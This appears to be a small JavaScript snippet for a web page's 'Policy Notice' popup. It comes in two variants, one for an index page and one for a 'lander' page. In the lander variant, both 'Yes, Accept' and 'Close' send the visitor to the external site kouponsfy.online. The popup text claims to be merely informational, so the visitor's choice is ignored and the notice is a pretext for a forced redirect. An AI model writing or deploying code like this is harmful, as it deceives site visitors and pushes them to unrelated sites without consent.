// Minimal split: same behavior, two separate functions to call per page
(function () {
const REDIRECT = "https://kouponsfy.online";

function buildPopup() {
if (document.querySelector(".modal-backdrop")) return null;

```
const bd = document.createElement("div");
bd.className = "modal-backdrop";
bd.innerHTML = `
  <div class="modal" role="dialog" aria-modal="true" aria-label="Policy Notice">
    <h3>Policy Notice</h3>
    <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
    <div class="modal-actions">
      <button class="btn" id="age-yes">Yes, Accept</button>
      <button class="btn ghost" id="age-no">Close</button>
    </div>
  </div>`;
document.body.appendChild(bd);
bd.style.display = "flex";

function close() {
  bd.classList.add("fade-out");
  setTimeout(() => bd.remove(), 180);
}

return { bd, close };
```

}

window.PopupIndex = function () {
const built = buildPopup();
if (!built) return;
const { bd, close } = built;

```
bd.querySelector("#age-yes").addEventListener("click", close);

bd.querySelector("#age-no").addEventListener("click", () => {
  window.location.href = "privacy.html";
});
```

};

window.PopupLander = function () {
const built = buildPopup();
if (!built) return;
const { bd } = built;

```
bd.querySelector("#age-yes").addEventListener("click", () => {
  window.location.href = REDIRECT;
});

bd.querySelector("#age-no").addEventListener("click", () => {
  window.location.href = REDIRECT;
});
```

};
})();
